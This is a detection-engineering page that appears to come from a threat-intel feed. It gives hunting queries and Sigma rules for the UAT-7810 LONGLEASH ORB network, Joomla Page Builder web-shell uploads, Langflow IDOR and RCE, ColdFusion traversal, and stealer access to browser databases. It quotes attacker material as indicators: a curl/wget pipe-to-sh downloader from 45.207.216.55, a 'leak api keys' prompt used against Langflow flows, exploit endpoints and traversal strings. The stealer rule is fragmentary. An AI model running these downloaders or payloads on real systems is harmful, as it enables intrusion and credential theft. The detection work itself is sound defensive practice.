A Chinese threat actor tracked as UAT-7810 is actively refining its bespoke malware to expand its Operational Relay Box (ORB) network by breaking into internet-facing networking devices. According to findings from Cisco Talos, UAT-7810 is an advanced persistent threat (APT) actor that's responsible for maintaining and proliferating LapDogs, an ORB network that first came to light in June 2025.

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code.
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] LONGLEASH / DOGLEASH / JARLEASH / LEASHTEST malware hash on Linux endpoints · Suspicious browser extension installation
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Outbound C2 to UAT-7810 / LONGLEASH ORB relay infrastructure · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
Outbound C2 to UAT-7810 / LONGLEASH ORB relay infrastructure AICommand & Control Medium
Hunts internal hosts connecting to the four UAT-7810 ORB relay servers that host LONGLEASH intermediate-C2 / multi-protocol proxy services on ports 8088, 2222 and a port-99 TLS listener bearing a self-signed 'C=exploit' certificate. Any egress from a defended asset to these dedicated relay IPs indicates the host is being used as (or is talking to) an ORB node. Rationale: Uses the four relay IPs (194.233.92.26, 217.15.160.247, 217.15.164.147, 95.182.100.231) confirmed by Talos; these are dedicated ORB relay hosts (ports 8088/2222/99, port-99 carrying the self-signed 'C=exploit' TLS cert fingerprint c2ab9adaba93ff094b8f3fc37d906014d870582039d276b7bd03e6fd583d8a15), so any contact is high-fidelity. Cross-checked against: • https://blog.talosintelligence.com/uat-7810/ • https://www.bleepingcomputer.com/news/security/chinese-hackers-develop-longleash-malware-to-expand-orb-network/ • https://expel.com/blog/gonzo-threat-hunting-lapdogs-shortleash/
ATT&CKT1090.003 T1571
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Internal threat-intel enrichment or sandbox detonation tooling actively probing the published IOC IPs
  • Vulnerability scanners / attack-surface tools sweeping the same hosting ranges
  • Security researcher workstation validating the Talos report
  • Shared-egress NAT where an unrelated third-party temporarily reuses one of these IPs (rare for dedicated relays)
  • Passive DNS / netflow collectors mirroring traffic that merely observed the IP
Suppression filter
| where not(InitiatingProcessFileName in~ ("nessus.exe","nmap.exe","vscan.exe") or InitiatingProcessFolderPath has_any (@"\ThreatIntel\", @"\Sandbox\"))
Response runbook
1) Triage: identify the internal source host and the initiating process/user; confirm the connection succeeded (bytes transferred) versus a blocked/failed attempt, and check the destination port (8088/2222/99). 2) Contain: block all four relay IPs at the perimeter, isolate the source host if the connection succeeded, and capture running processes and listening sockets on that host. 3) Hunt: pivot on the host for DOGLEASH/JARLEASH/LONGLEASH hashes (UC2), look for a local TLS listener on port 99 with the 'C=exploit' subject, and review whether the host is an internet-facing router/Linux appliance that may itself be an enrolled ORB node.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteIP in ("194.233.92.26","217.15.160.247","217.15.164.147","95.182.100.231")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, Protocol, InitiatingProcessFolderPath
| order by Timestamp desc
CommonSecurityLog
| where TimeGenerated > ago(30d)
| where DestinationIP in ("194.233.92.26","217.15.160.247","217.15.164.147","95.182.100.231")
| project TimeGenerated, DeviceVendor, DeviceProduct, SourceIP, SourceUserName, DestinationIP, DestinationPort, ApplicationProtocol, DeviceAction, RequestURL
| order by TimeGenerated desc

LONGLEASH / DOGLEASH / JARLEASH / LEASHTEST malware hash on Linux endpoints AIInstallation Medium
Detects the UAT-7810 implant binaries (LONGLEASH backdoor, JARLEASH Java admin backdoor and its startup script/config, LEASHTEST MIPS test ELF) by known SHA256 landing on or executing from onboarded Linux servers/appliances. Targets orgs whose internet-facing Linux hosts could be recruited into the ORB network. Rationale: Uses Talos-published SHA256 hashes for LEASHTEST (1b5649...), LONGLEASH (755fcee...), and two JARLEASH variants plus its startup-script/config hashes; exact-hash matches are zero-ambiguity IOCs, and the Java/ELF nature means they land on onboarded Linux/appliance hosts rather than Windows. Cross-checked against: • https://blog.talosintelligence.com/uat-7810/ • https://gbhackers.com/longleash-malware-attack/amp/
ATT&CKT1105 T1543
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Malware-analysis/sandbox VM where a responder intentionally stored the sample
  • Threat-intel team importing IOC sample sets into a research host
  • Backup/AV quarantine store retaining a copy of the flagged binary
  • SHA256 collision (cryptographically negligible)
  • Red-team emulation deliberately staging the same hash
Suppression filter
| where DeviceName !has "sandbox" and DeviceName !has "malware-lab" and FolderPath !has_any (@"/quarantine/", @"/threatintel/", @"/samples/")
Response runbook
1) Triage: confirm the host is production (not a sandbox/research VM), identify the file path and the process that wrote or executed it, and check whether execution actually occurred. 2) Contain: isolate the host from the network, snapshot for forensics, and kill/quarantine the binary plus any JARLEASH startup script and cron/systemd persistence. 3) Hunt: pull outbound netflow for connections to the four ORB relay IPs (UC1), search for a listening TLS socket on port 99 with the 'C=exploit' cert, and sweep the rest of the Linux estate for the same hashes and DOGLEASH variants.
let iocs = dynamic(["1b5649b479fd625de5c8120873644b5eb669cc89cd504582c18e0ae350fd8823","755fcee1337a252203002ecfdf673a08cfadeda8d738bef2d518a08e0626aa4f","324d95024fc8da5c92b5a1f4825aed5a2a91c9ca8fb6aa52abb332a4c9cf4257","bafba443170e54ef7fd431ce7f1b5e202719f3fd022e4ef70788904f574d2cdf","e799d72929d7ccc7f6b6109742b8cc482838303207efc989543b6e1ca6d16e9c","3b89d183eb014e29d9d0d4e45fc2b784a7fcfcf31dd48fd3bde30f8d956383d1"]);
union DeviceFileEvents, DeviceProcessEvents
| where Timestamp > ago(30d)
| where SHA256 in (iocs)
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
let iocs = dynamic(["1b5649b479fd625de5c8120873644b5eb669cc89cd504582c18e0ae350fd8823","755fcee1337a252203002ecfdf673a08cfadeda8d738bef2d518a08e0626aa4f","324d95024fc8da5c92b5a1f4825aed5a2a91c9ca8fb6aa52abb332a4c9cf4257","bafba443170e54ef7fd431ce7f1b5e202719f3fd022e4ef70788904f574d2cdf","e799d72929d7ccc7f6b6109742b8cc482838303207efc989543b6e1ca6d16e9c","3b89d183eb014e29d9d0d4e45fc2b784a7fcfcf31dd48fd3bde30f8d956383d1"]);
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileSHA256 in (iocs)
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, TargetFilePath, TargetFileName, TargetFileSHA256, DvcAction
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

ATT&CKT1539 T1555.003

DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"

| where FileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")

                                  @"\Microsoft\Edge\User Data\",
                                  @"\Mozilla\Firefox\Profiles\")
| where TargetFileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where ActingProcessName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")

id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01

description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/

date: 2026/05/02

    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'

SP Page Builder unauthenticated upload via asset.uploadCustomIcon (CVE-2026-48908) AIDelivery High
Hunts unauthenticated HTTP POST requests to the Joomla SP Page Builder asset.uploadCustomIcon task, the exact zero-day vector CISA added to KEV. The endpoint accepts a file with no auth and no type check, letting attackers plant a PHP web shell and a hidden Super Administrator account. Rationale: Uses the article's exact endpoint (option=com_sppagebuilder&task=asset.uploadCustomIcon) plus POST method; mySites.guru confirms this is the sole exploitation vector and that <=6.6.1 is affected (fixed 6.6.2), so any POST to this task on an internet-facing host is high-fidelity. Cross-checked against: • https://mysites.guru/blog/sp-page-builder-zero-day-uploadcustomicon-rce/ • https://nvd.nist.gov/vuln/detail/CVE-2026-48908 • https://censys.com/advisory/cve-2026-48908/
ATT&CKT1190 T1505.003
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A site administrator legitimately uploading a custom icon font through the SP Page Builder admin UI (would be authenticated and rare)
  • Vulnerability scanners (Nessus/Qualys/Nuclei) probing the endpoint during authorized assessments
  • Web-app pentest engagements replaying the PoC against a staging host
  • Security researchers fingerprinting the component version
Suppression filter
| where scStatus in (200, 302) or isnotempty(cIP)
Response runbook
1) Triage: pull the scStatus for the flagged POST — a 200/302 means the upload likely succeeded; capture cIP and csUserAgent. 2) Contain: block the source IP at the WAF, take the SP Page Builder component offline (note: unpublishing does NOT protect), and confirm the host is upgraded to 6.6.2+. 3) Hunt: search web root for PHP files under /media/com_sppagebuilder/assets/iconfont/*/fonts/ (e.g. codex-sppb-*.php) and enumerate Joomla users for any new Super Administrator with an @secure.local email address.
W3CIISLog
| where TimeGenerated > ago(30d)
| where csMethod == "POST"
| where csUriStem endswith "index.php"
| where csUriQuery has "com_sppagebuilder" and csUriQuery has "asset.uploadCustomIcon"
| project TimeGenerated, Computer, sSiteName, cIP, csMethod, csUriStem, csUriQuery, scStatus, csUserAgent
| order by TimeGenerated desc

Joomla Page Builder web shell drop under /media (CVE-2026-56290 / CVE-2026-48908) AIInstallation High
Detects creation of PHP files in Joomla web-served directories by a web-server/PHP process, matching the planted web shells from both KEV Joomla flaws: bhup.php under /media/com_pagebuilderck/gfonts/ (Page Builder CK) and codex-sppb-*.php under /media/com_sppagebuilder/assets/iconfont/*/fonts/ (SP Page Builder). Rationale: Anchors on the exact web shell filename/paths corroborated by mySites.guru (bhup.php keyed on $_POST['_upl'] under /media/com_pagebuilderck/gfonts/; codex-sppb-*.php under /media/com_sppagebuilder/assets/iconfont/*/fonts/) and constrains the writer to web-server/PHP processes — a new .php file written into a font/media asset dir by php-fpm is almost never legitimate. Cross-checked against: • https://mysites.guru/blog/sp-page-builder-zero-day-uploadcustomicon-rce/ • https://thehackernews.com/2026/07/cisa-adds-4-actively-exploited-adobe.html
ATT&CKT1505.003 T1190
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Joomla core or extension auto-update writing PHP into /media during an upgrade (would be initiated by the Joomla updater, not a bare php-fpm request)
  • A developer deploying a custom Joomla module or template that legitimately ships PHP in /media
  • Backup/restore tooling repopulating the web root
  • Composer/CLI-driven asset builds run by an admin on the host
Suppression filter
| where InitiatingProcessCommandLine !has "joomlaupdate" and InitiatingProcessCommandLine !has "com_installer"
Response runbook
1) Triage: open the created .php file and inspect for $_POST['_upl'] / file-manager code or eval/system calls; note the InitiatingProcess and the writing account. 2) Contain: quarantine/delete the shell, kill the php-fpm/apache worker if a live handler is attached, and block the uploader IP at the WAF. 3) Hunt: pivot on the same host for a new Joomla Super Administrator (@secure.local email), other stray PHP under /images, /templates, /administrator, and outbound connections initiated by the web process shortly after the drop.

Access to planted Joomla Page Builder web shell path AICommand & Control High
Hunts direct HTTP GET/POST access to the known planted web shell URLs from the two Joomla KEV flaws — /media/com_pagebuilderck/gfonts/bhup.php and /media/com_sppagebuilder/assets/iconfont/*/fonts/*.php — which are immediately reachable via direct request after upload. Rationale: The full shell path /media/com_pagebuilderck/gfonts/bhup.php is quoted verbatim by mySites.guru, and the SP Page Builder iconfont/fonts/*.php location is corroborated as the observed drop site — a PHP request into a font-asset folder has no legitimate use, so any hit is actionable. Cross-checked against: • https://mysites.guru/blog/sp-page-builder-zero-day-uploadcustomicon-rce/
ATT&CKT1505.003 T1071.001
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Incident responders or the site owner curling the shell URL to confirm/remediate it (will appear from internal/known IPs)
  • Vulnerability scanners that fingerprint the known IOC path
  • A legitimately named codex-sppb icon font PHP shipped by a benign third-party template (rare; verify contents)
  • Uptime/monitoring tools crawling every path under /media
Suppression filter
| where cIP != "127.0.0.1" and cIP !startswith "::1"
Response runbook
1) Triage: check scStatus and csMethod — a 200 with POST body indicates interactive shell use; capture cIP and csUserAgent to distinguish responder from attacker. 2) Contain: delete the shell file, block the accessing IP, and rotate any credentials/config the web app could read. 3) Hunt: correlate the accessing IP against the upload event (asset.uploadCustomIcon POST), review commands the web process ran after each shell hit, and check for a new Super Administrator account.
W3CIISLog
| where TimeGenerated > ago(30d)
| where csUriStem =~ "/media/com_pagebuilderck/gfonts/bhup.php"
    or csUriStem matches regex @"(?i)/media/com_sppagebuilder/assets/iconfont/[^/]+/fonts/[^/]+\.php$"
| project TimeGenerated, Computer, sSiteName, cIP, csMethod, csUriStem, csUriQuery, scStatus, csUserAgent
| order by TimeGenerated desc

Langflow cross-tenant IDOR credential theft chain (CVE-2026-55255) AIActions on Objectives High
Hunts the Sysdig-documented Langflow attack sequence: GET /api/v1/flows/ to enumerate other tenants' flow IDs, followed by POST /api/v1/responses replaying those IDs as the model parameter with input designed to leak provider secrets — the CVE-2026-55255 cross-tenant IDOR used to steal LLM and AWS keys. Rationale: Sysdig details the fixed-order playbook (auto_login -> GET /api/v1/flows/ to harvest IDs -> POST /api/v1/responses with input 'leak api keys'). Correlating the flow-enumeration GET with a same-source /responses POST within a short window captures the IDOR abuse while filtering benign single-endpoint traffic; time-window correlation is why this isn't emitted as Sigma. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited • https://github.com/advisories/GHSA-qrpv-q767-xqq2
ATT&CKT1190 T1552.001 T1213
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A legitimate Langflow power user listing their own flows then running one via the API in quick succession
  • Automated CI/CD or SDK integrations that call /api/v1/flows/ then /api/v1/responses as normal workflow
  • Langflow health-check or synthetic monitoring hitting both endpoints
  • Internal QA scripts exercising the flow-execution API
Suppression filter
| where cIP != "" and scStatus < 400
Response runbook
1) Triage: confirm the /responses POST references a flow ID that does NOT belong to the requesting session's tenant (cross-tenant IDOR) and check the source IP against 45.207.216.55. 2) Contain: block the source IP, upgrade Langflow past the patched release, and rotate ALL provider secrets stored in flows (LLM API keys, AWS keys). 3) Hunt: pivot to the same IP for CVE-2026-33017 RCE follow-on (see the /tmp/lang_pwn and slt downloader UC) and audit AWS CloudTrail for use of any leaked keys.
let win = 10m;
let flows = W3CIISLog
    | where TimeGenerated > ago(30d)
    | where csMethod == "GET" and csUriStem endswith "/api/v1/flows/"
    | project FlowTime = TimeGenerated, Computer, cIP;
W3CIISLog
| where TimeGenerated > ago(30d)
| where csMethod == "POST" and csUriStem endswith "/api/v1/responses"
| join kind=inner flows on cIP
| where TimeGenerated between (FlowTime .. FlowTime + win)
| project TimeGenerated, FlowTime, DelaySec = datetime_diff('second', TimeGenerated, FlowTime), Computer, cIP, csUriStem, scStatus, csUserAgent
| order by TimeGenerated desc

| tstats summariesonly=false count values(Web.http_method) as methods dc(Web.url) as url_count min(_time) as firstTime max(_time) as lastTime from datamodel=Web.Web where (Web.url="*/api/v1/flows/*" OR Web.url="*/api/v1/responses*") by Web.src, Web.dest | `drop_dm_object_name(Web)` | where url_count>=2 | sort - lastTime
Langflow RCE second-stage downloader curl/wget to 45.207.216.55:8084/slt (CVE-2026-33017) AIInstallation Medium
Detects the CVE-2026-33017 RCE payload observed by Sysdig: a Langflow custom component that shells out to '(curl -fsSL http://45.207.216.55:8084/slt || wget -q http://45.207.216.55:8084/slt) | sh', dropping a /tmp/lang_pwn marker and pulling a second-stage botnet/cryptojacking payload from the operator host. Rationale: The download one-liner (curl -fsSL http://45.207.216.55:8084/slt || wget -q http://45.207.216.55:8084/slt | sh) and the /tmp/lang_pwn marker come directly from Sysdig's payload analysis; the operator IP 45.207.216.55 is in the article's IOC list, making both the command string and the network destination hard IOCs. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited
ATT&CKT1059.004 T1105 T1071.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A responder intentionally curling the IOC URL from a sandbox to retrieve the sample (will be a known analyst host)
  • Threat-intel enrichment tooling fetching the payload for detonation
  • Almost none otherwise — 45.207.216.55 and /tmp/lang_pwn are attacker-specific
Suppression filter
| where InitiatingProcessCommandLine !has "sandbox" and AccountName !in~ ("threatanalyst")
Response runbook
1) Triage: confirm the parent of curl/wget is a Langflow/python process and whether the pipe-to-sh succeeded; check for /tmp/lang_pwn on disk. 2) Contain: isolate the host, kill the second-stage process and any spawned miner/bot, and block 45.207.216.55 egress network-wide. 3) Hunt: enumerate cron/systemd persistence added by the payload, look for other hosts contacting 45.207.216.55:8084, and confirm whether the preceding IDOR (CVE-2026-55255) leaked cloud keys that now need rotation.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("curl","wget","sh","bash","dash")
| where ProcessCommandLine has "45.207.216.55" and ProcessCommandLine has "slt"
    or ProcessCommandLine has "/tmp/lang_pwn"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
Syslog
| where TimeGenerated > ago(30d)
| where ProcessName in~ ("curl","wget","sh","bash","dash") or SyslogMessage has_any ("curl","wget")
| where SyslogMessage has "45.207.216.55" and SyslogMessage has "slt"
    or SyslogMessage has "/tmp/lang_pwn"
| project TimeGenerated, Computer, HostIP, ProcessName, SyslogMessage
| order by TimeGenerated desc

Langflow C2 egress to operator host 45.207.216.55 AICommand & Control Medium
Network-layer companion detection for the Langflow campaign: any outbound connection to the operator host 45.207.216.55 (observed on port 8084 serving /slt). Catches the RCE downloader and subsequent second-stage C2 even when command-line telemetry is unavailable. Rationale: 45.207.216.55 is the operator IP named in both the article IOC list and Sysdig's write-up (serving the /slt second stage on :8084); a hard IP IOC makes any egress to it high-confidence with near-zero benign traffic. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited
ATT&CKT1071.001 T1105
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel / sandbox infrastructure deliberately connecting to the IOC for detonation
  • A security proxy pre-fetching the URL for URL-reputation scanning
  • Essentially no legitimate business traffic to this host
Response runbook
1) Triage: identify the initiating process on the connecting host — a Langflow/python or curl/wget parent confirms the RCE chain. 2) Contain: block 45.207.216.55 at the perimeter, isolate the host, and snapshot for forensics. 3) Hunt: sweep all hosts for prior connections to 45.207.216.55, look for /tmp/lang_pwn and injected Langflow custom components, and rotate any cloud/LLM keys exposed via the paired IDOR.

| where Timestamp > ago(30d)
| where RemoteIP == "45.207.216.55"
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessAccountName
| order by Timestamp desc
ImNetworkSession
| where TimeGenerated > ago(30d)
| where DstIpAddr == "45.207.216.55"
| project TimeGenerated, SrcIpAddr, DstIpAddr, DstPortNumber, DvcHostname, NetworkApplicationProtocol, Url
| order by TimeGenerated desc

Adobe ColdFusion path traversal exploitation (CVE-2026-48282) AIExploitation Medium
Hunts web requests exhibiting the CVE-2026-48282 Adobe ColdFusion path-traversal exploitation — directory-traversal encodings in the URI/query and/or requests from the confirmed exploitation source 103.207.14.220 (India), which was observed attacking within hours of disclosure. Rationale: Combines the article's confirmed first-observed exploitation IP (103.207.14.220, provided by KEVIntel) with canonical path-traversal encodings for the CVE-2026-48282 (path traversal -> code execution) class; the IP is a hard IOC while the traversal patterns catch other actors reusing the same primitive. Cross-checked against: • https://thehackernews.com/2026/07/cisa-adds-4-actively-exploited-adobe.html • https://nvd.nist.gov/vuln/detail/CVE-2026-48282
ATT&CKT1190 T1083
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate application URLs containing encoded '..' sequences in benign parameters (rare but possible in some frameworks)
  • Web vulnerability scanners generating traversal payloads during authorized scans
  • Security proxies that URL-encode paths in ways that trip the encoded-dot patterns
  • A CDN or WAF appliance rewriting URLs with encoded segments
Suppression filter
| where scStatus in (200, 500) or cIP == "103.207.14.220"
Response runbook
1) Triage: for the flagged request, decode csUriQuery and confirm the traversal targets a sensitive path; check scStatus for success (200) vs blocked (403). 2) Contain: block the source IP (103.207.14.220 and any repeat offenders), apply the Adobe ColdFusion patch, and restrict the ColdFusion admin surface. 3) Hunt: look for post-exploit ColdFusion (jrun/coldfusion/cfexec) process spawning cmd.exe/powershell.exe, new files written to the CFIDE/web root, and outbound connections from the ColdFusion service account.
W3CIISLog
| where TimeGenerated > ago(30d)
| where cIP == "103.207.14.220"
    or csUriStem has_any ("..%2f","..%5c","%2e%2e%2f","%2e%2e%5c")
    or csUriQuery has_any ("..%2f","..%5c","%2e%2e%2f","%2e%2e%5c","../../")
    or csUriStem contains "../../"
| project TimeGenerated, Computer, sSiteName, cIP, csMethod, csUriStem, csUriQuery, scStatus, csUserAgent
| order by TimeGenerated desc

Web-application process spawning a shell (post-exploitation of ColdFusion/Joomla/Langflow) AIExploitation Medium
Detects web-application server processes — ColdFusion (coldfusion/jrun/java), Joomla PHP handlers (php/php-fpm/apache), and Langflow (python/uvicorn) — spawning an interactive shell or LOLBin, the common post-exploitation step after the four KEV flaws in this article are triggered. Rationale: Grounds a classic web-shell/RCE follow-on pivot in the specific server stacks named in the article (Adobe ColdFusion, Joomla/PHP, Langflow/Python); pairing each web-app parent with a shell/LOLBin child is the highest-signal way to catch execution across all four flaws without an app-specific string. Cross-checked against: • https://thehackernews.com/2026/07/cisa-adds-4-actively-exploited-adobe.html • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited

Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • PHP/Python apps that legitimately shell out (e.g. ImageMagick/ffmpeg wrappers, backup scripts, cron-triggered maintenance)
  • Langflow itself spawning python subprocesses for custom components (baseline the normal children)
  • Deployment/CI agents running under the web-app service account
  • Monitoring agents invoking curl/id/whoami for health checks
Suppression filter
| where ProcessCommandLine !has "healthcheck" and ProcessCommandLine !has "/usr/lib/" and AccountName !endswith "$"
Response runbook
1) Triage: inspect the child command line — recon (whoami/id), a download (curl/wget to an external IP), or an interactive shell all indicate hands-on-keyboard or scripted RCE. 2) Contain: isolate the host, kill the child chain, and block any external IP it contacted (e.g. 45.207.216.55). 3) Hunt: correlate with the preceding web-log exploit event (uploadCustomIcon POST, /api/v1/responses, or ColdFusion traversal), search for dropped web shells/persistence, and rotate credentials the web-app service account could reach.
DeviceProcessEvents
| where Timestamp > ago(14d)
| where InitiatingProcessFileName in~ ("php","php-fpm","php-cgi","httpd","apache2","nginx","w3wp.exe","coldfusion.exe","jrun.exe","java","python","python3","uvicorn")
| where FileName in~ ("cmd.exe","powershell.exe","pwsh","bash","sh","dash","whoami","id","curl","wget","certutil.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(14d)
| where ParentProcessName has_any ("php","php-fpm","php-cgi","httpd","apache2","nginx","w3wp.exe","coldfusion","jrun","java","python","uvicorn")
| where TargetProcessName has_any ("cmd.exe","powershell.exe","pwsh","/bash","/sh","/dash","whoami","curl","wget","certutil.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, TargetProcessName, ActingProcessCommandLine
| order by TimeGenerated desc
title: Web Application Process Spawning Shell (ColdFusion/Joomla/Langflow Post-Exploitation)
id: 1b6f9d40-2a83-4c57-9e0b-8d2f4a71c6e9
description: Detects web-app server processes spawning shells/LOLBins, the post-exploitation step following the CISA KEV Adobe ColdFusion, Joomla, and Langflow flaws.
references:
    - https://thehackernews.com/2026/07/cisa-adds-4-actively-exploited-adobe.html
author: SOC Detection Engineering
date: 2026/07/08
tags:
    - attack.t1190
    - attack.t1059
    - attack.t1505.003
logsource:
    category: process_creation
detection:
    selection:
        ParentImage|endswith:
            - '/php'
            - '/php-fpm'
            - '/httpd'
            - '/apache2'
            - '/python'
            - '/python3'
            - '\\w3wp.exe'
            - '\\coldfusion.exe'
            - '\\jrun.exe'
        Image|endswith:
            - '\\cmd.exe'
            - '\\powershell.exe'
            - '/bash'
            - '/sh'
            - '/dash'
            - '\\certutil.exe'
            - '/curl'
            - '/wget'
    condition: selection
level: medium
source:linux.auditd @auditd.type:EXECVE @process.parent.name:(php OR php-fpm OR php-cgi OR httpd OR apache2 OR nginx OR java OR python OR python3 OR uvicorn) @process.name:(bash OR sh OR dash OR whoami OR id OR curl OR wget)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/(php|php-fpm|php-cgi|httpd|apache2|nginx|w3wp\.exe|coldfusion\.exe|jrun\.exe|java|python3?|uvicorn)$/i
| ImageFileName=/\/(cmd\.exe|powershell\.exe|bash|sh|dash|whoami|id|curl|wget|certutil\.exe)$/i
| groupBy([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Endpoint.Processes.parent_process_name IN ("php","php-fpm","php-cgi","httpd","apache2","nginx","w3wp.exe","coldfusion.exe","jrun.exe","java","python","python3","uvicorn") Endpoint.Processes.process_name IN ("cmd.exe","powershell.exe","bash","sh","dash","whoami","id","curl","wget","certutil.exe") by Endpoint.Processes.dest, Endpoint.Processes.user, Endpoint.Processes.parent_process_name, Endpoint.Processes.process_name, Endpoint.Processes.process | `drop_dm_object_name(Endpoint.Processes)` | sort - lastTime
